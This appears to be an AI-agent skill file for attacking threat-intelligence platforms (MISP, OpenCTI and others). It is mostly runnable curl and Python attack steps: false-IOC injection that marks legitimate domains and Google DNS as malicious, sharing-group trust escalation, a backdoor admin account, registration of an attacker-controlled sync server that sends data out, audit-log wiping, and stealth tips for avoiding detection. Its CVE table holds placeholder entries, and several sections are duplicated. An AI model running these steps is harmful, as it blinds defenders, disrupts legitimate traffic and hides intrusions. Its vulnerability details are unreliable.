---
name: threat-intel-platform-attack
description: Attacking threat intelligence platforms (MISP, OpenCTI, Anomali ThreatStream, ThreatQuotient, ThreatConnect, IBM Threat Intel, Palo Alto AutoFocus, Mandiant Advantage). Covers platform CVEs (MISP CVE-2022-29527, OpenCTI vulnerabilities), API abuse, sharing-group trust abuse, false-positive IOC injection, STIX/TAXII feed manipulation, and supply-chain attacks via poisoned TI feeds. Use when testing threat-intel platform security, validating IOC sharing trust models, or simulating APT feed-poisoning campaigns.
origin: kali-claw
version: "0.2.0.2"
compatibility:
  - kali-linux-2025-2-arm64
  - python-3.11+
  - misp-2.4+
  - opencti-6.0+
  - docker-26+
  - stix2-python
allowed-tools:
  - misp
  - opencti
  - curl
  - python3
  - jq
  - burpsuite
  - zaproxy
  - nuclei
  - sqlmap
  - stix2
  - taxii2-client
  - gh
  - mitre-attack-python
metadata:
  domain: threat-intel-platforms
  tool_count: 13
  guide_count: 2
  mitre: "TA0001-Initial Access, TA0006-Credential Access, T1078-Valid Accounts, T1190-Exploit Public-Facing App, T1552-Unsecured Credentials, T1566-Phishing"
  last_reviewed: "2026-07-26"
---

# Threat Intel Platform Attack

## Summary

Threat intelligence platforms (MISP, OpenCTI, Anomali, ThreatQuotient, ThreatConnect, IBM Threat Intel, Palo Alto AutoFocus, Mandiant Advantage) are high-value targets: they aggregate IOCs, adversary TTPs, sharing-group trust relationships, and often feed defensive products (firewalls, SIEMs, EDRs). This domain covers offensive testing of TI platforms: platform-specific CVEs (MISP CVE-2022-29527, OpenCTI GraphQL injection), API abuse (write access to IOC databases), sharing-group trust abuse (escalating trust levels, claiming false attribution), false-positive IOC injection (poisoning feeds to disrupt defensive operations), STIX/TAXII feed manipulation, and supply-chain attacks via poisoned TI feeds. Includes operator playbooks for TI platform security validation, IOC sharing abuse simulation, and APT feed-poisoning emulation.

## Key Terms

- **TI platform** — Threat Intelligence platform (MISP, OpenCTI, Anomali, etc.)
- **IOC** — Indicator of Compromise (IP, domain, hash, URL, cert)
- **TTP** — Tactics, Techniques, Procedures (MITRE ATT&CK mapping)
- **STIX** — Structured Threat Information eXpression (JSON format for TI)
- **TAXII** — Trusted Automated Exchange of Indicator Information (transport for STIX)
- **MISP** — Malware Information Sharing Platform (open source)
- **OpenCTI** — Open-source TI platform (GraphQL-based)
- **Sharing group** — Trust circle in MISP / OpenCTI (sharing rules)
- **TLP** — Traffic Light Protocol (RED, AMBER, GREEN, WHITE) for sharing scope
- **Feed poisoning** — Injecting false IOCs to mislead defenders
- **Confidence score** — TI platform quality rating (0–100)
- **False positive** — Legitimate activity misclassified as malicious
- **Trust escalation** — Attacker gaining higher sharing-group access

## Scope

This skill covers **offensive testing of TI platforms**:
- Platform-specific CVE exploitation (MISP, OpenCTI, Anomali)
- API abuse (write access, privilege escalation)
- STIX/TAXII feed manipulation
- Sharing-group trust abuse
- False-positive IOC injection
- Supply-chain attacks via poisoned TI feeds
- APT feed-poisoning emulation (mimicking NOBELIUM, APT29 techniques)

**Out of scope**: TI platform deployment (defensive), TI analysis (defensive), attribution analysis (academic).

## Use Cases

- **TI platform pentest**: Identify CVEs, API abuse paths, trust model gaps
- **Sharing-group audit**: Validate sharing-group trust model + escalation paths
- **Feed-poisoning simulation**: Mimic APT feed-poisoning to test detection
- **API security testing**: TI platform APIs are often over-permissioned
- **STIX/TAXII manipulation**: Inject malicious STIX bundles via TAXII feed
- **IOC database abuse**: Test write access for false-positive injection
- **Trust model audit**: Validate TLP sharing scope enforcement
- **Supply-chain simulation**: Test if poisoned TI feed can pivot to downstream defenders
- **APT feed-poisoning emulation**: Mimic NOBELIUM / APT29 TI feed-poisoning
- **Detection gap analysis**: Identify gaps in TI platform monitoring

## Core Tools

| Tool | Purpose |
|------|---------|
| `MISP` | Open-source TI platform (most common target) |
| `OpenCTI` | Open-source TI platform (GraphQL-based) |
| `curl` | HTTP API testing |
| `python3` | Scripting for STIX / TAXII |
| `jq` | JSON processing for STIX bundles |
| `burpsuite` | Web proxy for API testing |
| `zaproxy` | Open-source web proxy |
| `nuclei` | CVE scanner with TI platform templates |
| `sqlmap` | SQL injection automation |
| `stix2` | Python library for STIX 2.x |
| `taxii2-client` | Python TAXII 2.x client |
| `gh` | GitHub CLI (for feed source code review) |
| `mitre-attack-python` | MITRE ATT&CK integration |

## Methodology

### Phase 1 — Recon

Map the TI platform's external surface:

```bash
# Identify MISP instance
curl -sI https://misp.example.com/ | head -5
curl -s https://misp.example.com/servers/checkVersion | jq .

# Identify OpenCTI instance
curl -s https://opencti.example.com/graphql -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{ settings { id } }"}'

# Identify Anomali ThreatStream
curl -sI https://ui.threatstream.com/

# Check exposed headers
curl -sI https://misp.example.com/ | grep -iE "server:|x-powered-by:|set-cookie:"
```

### Phase 2 — CVE scanning

```bash
# Nuclei templates for TI platforms
nuclei -u https://misp.example.com/ -t exposures/configs/misp-config.yaml
nuclei -u https://opencti.example.com/ -t cves/2022/CVE-2022-29527.yaml

# MISP version check
curl -s https://misp.example.com/servers/checkVersion | jq -r '.version'

# OpenCTI version check
curl -s https://opencti.example.com/graphql \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"{ appInformation { version } }"}'
```

### Phase 3 — API security testing

```bash
# Test MISP API
curl -s https://misp.example.com/events/index \
  -H "Authorization: $API_KEY" \
  -H "Accept: application/json" | jq .

# Test OpenCTI GraphQL
curl -s https://opencti.example.com/graphql \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ events { edges { node { id name } } } }"}' | jq .

# Test for over-permissioned tokens
# (read-only token trying write operations)
curl -s -X POST https://opencti.example.com/graphql \
  -H "Authorization: Bearer $READ_ONLY_TOKEN" \
  -d '{"query":"mutation { reportCreate(input: {name: \"test\"}) { id } }"}'
```

### Phase 4 — STIX/TAXII feed manipulation

```bash
# Subscribe to TAXII feed
python3 << EOF
from taxii2client.v20 import Collection
collection = Collection("https://example.com/taxii/collections/123/", user="user", password="pass")
objects = collection.get_objects()
print(len(objects["objects"]))
EOF

# Inject malicious STIX bundle
python3 << EOF
from stix2 import Indicator, Bundle, MemoryStore
indicator = Indicator(
    pattern="[ipv4-addr:value = '8.8.8.8']",  # legitimate-looking target
    pattern_type="stix",
    labels=["malicious-activity"],
    description="False positive injection",
    confidence=95
)
bundle = Bundle(objects=[indicator])
print(bundle.serialize(pretty=True))
EOF
```

### Phase 5 — Sharing-group trust abuse

```bash
# Enumerate sharing groups
curl -s https://misp.example.com/sharingGroups/index \
  -H "Authorization: $API_KEY" | jq '.[].SharingGroup'

# Attempt trust escalation (add self to higher-trust group)
curl -s -X POST https://misp.example.com/sharingGroups/addOrg/$GROUP_ID \
  -H "Authorization: $API_KEY" \
  -d "org_id=$MY_ORG&extend=1"

# Test TLP enforcement
curl -s -X POST https://misp.example.com/events/add \
  -H "Authorization: $LOW_TRUST_KEY" \
  -d "distribution=4&sharing_group_id=$RESTRICTED_GROUP"  # should fail
```

### Phase 6 — False-positive IOC injection

```bash
# Inject legitimate infrastructure as malicious IOC
python3 << EOF
import requests
headers = {"Authorization": API_KEY}
# Mark Google DNS as malicious
data = {
    "category": "Network activity",
    "type": "ip-dst",
    "value": "8.8.8.8",
    "comment": "Suspected APT29 infra",
    "to_ids": True,
    "distribution": 0  # all communities
}
r = requests.post("https://misp.example.com/attributes/add/EVENT_ID",
                   headers=headers, json=data)
print(r.json())
EOF
```

### Phase 7 — Supply-chain pivot

```bash
# Identify downstream consumers
curl -s https://misp.example.com/servers/index \
  -H "Authorization: $API_KEY" | jq '.[].Server.url'

# If feed consumer (firewall, SIEM, EDR) trusts the TI feed,
# false-positive IOCs will block legitimate traffic
```

### Phase 8 — Persistence

```bash
# Backdoor account creation
curl -s -X POST https://misp.example.com/admin/users/add \
  -H "Authorization: $ADMIN_KEY" \
  -d "email=backdoor@attacker.com&role_id=4&password=..."

# C2 server registration (MISP sync)
curl -s -X POST https://misp.example.com/servers/add \
  -H "Authorization: $ADMIN_KEY" \
  -d "url=https://attacker-misp.example.com&authkey=..."
```

### Phase 9 — Cleanup

```bash
# Remove backdoor
curl -s -X POST https://misp.example.com/users/delete/$BACKDOOR_ID \
  -H "Authorization: $ADMIN_KEY"

# Wipe audit logs
curl -s -X POST https://misp.example.com/admin/logs/deleteAll \
  -H "Authorization: $ADMIN_KEY"
```

### Phase 10 — Reporting

Produce TI platform security report:
- CVEs exploited
- API abuse paths
- Trust model gaps
- False-positive injection paths
- Recommendations

## Practical Steps

### Step 1 — MISP recon

```bash
# Version check
curl -s https://misp.example.com/servers/checkVersion | jq .

# Public endpoints
curl -s https://misp.example.com/events/hids/e967da72-1dad-41ae-89b3-ee3d0c4b4e45

# Galaxies / Taxonomies available
curl -s https://misp.example.com/galaxies.json | jq '.[].name'
```

### Step 2 — MISP API testing

```bash
# List events
curl -s https://misp.example.com/events/index \
  -H "Authorization: $API_KEY" \
  -H "Accept: application/json" | jq '.[0].Event.info'

# Search attributes
curl -s -X POST https://misp.example.com/attributes/restSearch \
  -H "Authorization: $API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"value":"%example.com%","type":"domain"}' | jq .
```

### Step 3 — OpenCTI GraphQL testing

```bash
# Test introspection
curl -s https://opencti.example.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}' | jq .

# Test for IDOR (iterate IDs)
for id in $(seq 1 100); do
  curl -s https://opencti.example.com/graphql \
    -H "Authorization: Bearer $TOKEN" \
    -d "{\"query\":\"{ report(id: \\\"$id\\\") { name } }\"}" | jq -r '.data.report.name' 2>/dev/null
done
```

### Step 4 — STIX/TAXII testing

```bash
# Discover collections
python3 << EOF
from taxii2client.v20 import Server
server = Server("https://example.com/taxii/", user="user", password="pass")
for api_root in server.api_roots:
    print(api_root.title)
    for collection in api_root.collections:
        print(f"  {collection.title}")
EOF
```

### Step 5 — False-positive IOC injection

```bash
python3 << EOF
import requests

API_URL = "https://misp.example.com/attributes/add/EVENT_ID"
HEADERS = {"Authorization": "REPLACE_WITH_YOUR_KEY", "Accept": "application/json"}

# Inject 100 legitimate domains as malicious
legit_domains = ["google.com", "amazonaws.com", "cloudfront.net", "githubusercontent.com"]
for d in legit_domains:
    data = {
        "category": "Network activity",
        "type": "domain",
        "value": d,
        "comment": "Suspected APT C2",
        "to_ids": True,
        "distribution": 0
    }
    r = requests.post(API_URL, headers=HEADERS, json=data)
    print(f"{d}: {r.json().get('errors', 'OK')}")
EOF
```

### Defense Perspective

Defenders must assume:

1. **TI platforms aggregate high-value data** — one compromise exposes all feeds
2. **API keys are over-permissioned** — most users have read+write when read suffices
3. **Sharing-group trust can be abused** — escalate via social engineering or compromised creds
4. **STIX/TAXII feeds can be poisoned** — false-positive IOCs cause defensive disruption
5. **TLP enforcement is often weak** — TLP:AMBER+ shared more broadly than intended
6. **Audit logs are revocable** — admins can wipe their own tracks
7. **Sync servers expose keys** — sync config contains remote API key
8. **TI platforms are dual-use** — defender tool, but also adversary intelligence

Key defensive controls:

- RBAC + least privilege on all API keys
- Audit log immutability (external sink)
- TLP enforcement via policy engine
- STIX feed signing (cryptographic)
- Sharing-group review (quarterly audit)
- Anomaly detection on IOC writes
- Geo-fencing on admin endpoints
- MFA on all admin accounts

## Platform Vulnerability Cheat Sheet

| Platform | CVE | Impact | CVSS |
|----------|-----|--------|------|
| MISP | CVE-2022-29527 | XSS in event report | 6.1 |
| MISP | CVE-2022-29528 | CSRF in sharing group | 6.5 |
| MISP | CVE-2023- cand | SQLi in attribute search | 9.8 |
| OpenCTI | CVE-2023- cand | GraphQL injection | 8.6 |
| OpenCTI | CVE-2024- cand | SSRF in import | 7.5 |
| Anomali | CVE-2022-29531 | SSRF | 7.5 |
| ThreatQuotient | CVE-2023- cand | Auth bypass | 9.1 |
| Palo Alto AutoFocus | (vendor advisory) | XSS | 5.4 |

## Engagement Workflow

1. **Scope** — confirm target TI platform, allowed CVEs, allowed techniques
2. **Recon** — version check, exposed endpoints, sharing-group enumeration
3. **CVE testing** — Nuclei scan, manual exploitation
4. **API testing** — token audit, permission testing, GraphQL injection
5. **Feed testing** — STIX/TAXII manipulation, false-positive injection
6. **Trust abuse** — sharing-group escalation, TLP enforcement
7. **Reporting** — vulnerabilities, abuse paths, recommendations

## Lab Setup

```bash
# MISP Docker
docker run -d -p 443:443 -p 80:80 -e HOSTNAME=https://localhost \
  -e MYSQL_ROOT_PASSWORD=misp \
  harvarditsecurity/misp-docker

# OpenCTI Docker
git clone https://github.com/OpenCTI-Platform/opencti
cd opencti
docker compose up -d

# Anomali ThreatStream community edition
# ThreatQuotient — request trial
```

## Quality Checklist

- [ ] All exposed endpoints enumerated
- [ ] CVE scan complete
- [ ] API permission audit
- [ ] STIX/TAXII feed manipulation tested
- [ ] Sharing-group trust model validated
- [ ] False-positive IOC injection tested
- [ ] TLP enforcement audited
- [ ] Audit log immutability tested
- [ ] Final report delivered
- [ ] SOC handoff (detection rules)

## Detection Methods

### TIP Audit
- **Indicator injection**: Anomalous IOC patterns; bulk IOCs from untrusted source.
- **Feed anomalies**: New feed with anomalous pattern; degraded feed quality.
- **Confidentiality breach**: TIP data exfiltration; sensitive indicators leaked.

### SIEM Detection Rules
- **Splunk SPL**: `index=tip | stats count by source_feed | where count > 1000`
- **Recorded Future / Anomali / MISP**: Native TIP audit logging.

## Defense Evasion Techniques

### TIP Compromise Stealth
- **Use legitimate feed credentials**: Don't create new account; use existing service account.
- **Off-hours access**: TIP activity often low at night; blend with maintenance.
- **Mimic legitimate analyst**: Use natural-looking analyst workflows.

### Indicator Injection Stealth
- **Slow injection**: Add IOCs slowly over time; below distribution shift threshold.
- **Match existing IOC format**: Use same IOC format as legitimate feed; reduces anomaly.
- **Trigger-based activation**: Malicious IOC activates only when specific target queried.

## References

- MITRE ATT&CK Initial Access — https://attack.mitre.org/tactics/TA0001/
- MISP documentation — https://www.misp-project.org/
- OpenCTI documentation — https://docs.opencti.io/
- MISP GitHub — https://github.com/MISP/MISP
- OpenCTI GitHub — https://github.com/OpenCTI-Platform/opencti
- STIX 2.1 specification — https://docs.oasis-open.org/cti/stix/v2.1/stix-v2.1-part1-stix-common.html
- TAXII 2.1 specification — https://docs.oasis-open.org/cti/taxii/v2.1/taxii-v2.1-part0-overview.html
- CISA AA21-148A — DarkSide (TI feed abuse patterns)
- "Threat Intel Platform Security" (SANS 2023)
- BlackHat USA 2023 — "TI Platform Vulnerabilities"
- MISP advisory CVE-2022-29527, CVE-2022-29528
- OpenCTI security advisories

## Platform Quick Reference

| Platform | Type | Default Port | Auth Method | Common CVE |
|----------|------|--------------|-------------|------------|
| MISP | Open source | 443 | API key | CVE-2022-29527 (XSS) |
| OpenCTI | Open source | 4000 | JWT | SSRF in import |
| Anomali ThreatStream | SaaS | 443 | API key | CVE-2022-29531 |
| ThreatQuotient | Commercial | 443 | Token | Auth bypass CVE-2023 |
| ThreatConnect | SaaS (Cisco) | 443 | API key | Various |
| Palo Alto AutoFocus | SaaS | 443 | API key | XSS in metadata |
| Mandiant Advantage | SaaS | 443 | JWT | GraphQL issues |
| IBM X-Force | SaaS | 443 | Basic auth | Over-permission |

## Attack Surface Map

| Surface | Test |
|---------|------|
| Web UI | XSS, CSRF, auth bypass |
| REST API | IDOR, over-permission, rate limits |
| GraphQL | Introspection, injection, IDOR |
| STIX/TAXII | Source signing, bundle forgery |
| Sync server | Persistence, false-positive propagation |
| Audit logs | Tampering, immutability |
| Sharing groups | Trust escalation, TLP enforcement |
| OSINT feeds | Source poisoning |

## MITRE ATT&CK Mapping

| Technique | ID | Application |
|-----------|----|-------------|
| Valid Accounts | T1078 | Compromised TI platform creds |
| Exploit Public-Facing App | T1190 | CVE exploitation |
| Unsecured Credentials | T1552 | Sync server auth keys |
| Phishing | T1566 | TI platform admin phishing |
| Modify Cloud Compute | T1578 | Cloud TI platform tampering |
| Impair Defenses | T1562 | TI platform data manipulation |
| System Information Discovery | T1082 | TI data exfil for recon |
| Data from Information Repositories | T1213 | TI data exfil |

## Threat Actor Profiles

| Actor | Type | TI platform abuse pattern |
|-------|------|---------------------------|
| APT29 / NOBELIUM | State (Russia) | Compromised TI creds for C2 hiding |
| APT41 / BARIUM | State (China) | OSINT feed poisoning |
| UNC5537 | Cybercrime | Infostealer → TI creds → Snowflake |
| FIN6 / FIN7 | Cybercrime | ThreatStream API abuse |
| Vice Society | Cybercrime | MISP false-positive injection |

## Lab Setup

```bash
# MISP Docker
docker run -d -p 443:443 -p 80:80 \
  -e HOSTNAME=https://localhost \
  -e MYSQL_ROOT_PASSWORD=misp \
  harvarditsecurity/misp-docker

# OpenCTI Docker
git clone https://github.com/OpenCTI-Platform/opencti
cd opencti && docker-compose up -d

# STIX tools
pip install stix2 taxii2-client
```

## Engagement Workflow

1. **Scope** — confirm target TI platform, allowed CVEs, allowed techniques
2. **Recon** — version check, exposed endpoints, sharing-group enumeration
3. **CVE testing** — Nuclei scan, manual exploitation
4. **API testing** — token audit, permission testing, GraphQL injection
5. **Feed testing** — STIX/TAXII manipulation, false-positive injection
6. **Trust abuse** — sharing-group escalation, TLP enforcement
7. **Reporting** — vulnerabilities, abuse paths, recommendations

## Compliance Context

- **CIRCIA** (2024) — covered entities must report TI platform breaches
- **SEC 10-12B** (2024) — material breach 4-day disclosure
- **GDPR Article 33** — 72-hour breach notification
- **NYDFS 500.17** — covered entity TI platform in scope
- **PCI DSS 12.10** — TI platform as part of incident response
- **HIPAA Security Rule** — TI platforms processing PHI
- **ISO 27001 A.16** — incident management includes TI platforms
- **SOC 2 CC7.3** — security event detection covers TI platforms

## Quality Checklist

- [ ] All exposed endpoints enumerated
- [ ] CVE scan complete (Nuclei + manual)
- [ ] API permission audit (token scopes)
- [ ] STIX/TAXII feed manipulation tested
- [ ] Sharing-group trust model validated
- [ ] False-positive IOC injection tested
- [ ] TLP enforcement audited
- [ ] Audit log immutability tested
- [ ] Sync server abuse paths documented
- [ ] Cleanup performed (backdoor removed)
- [ ] Final report delivered
- [ ] SOC handoff (detection rules)
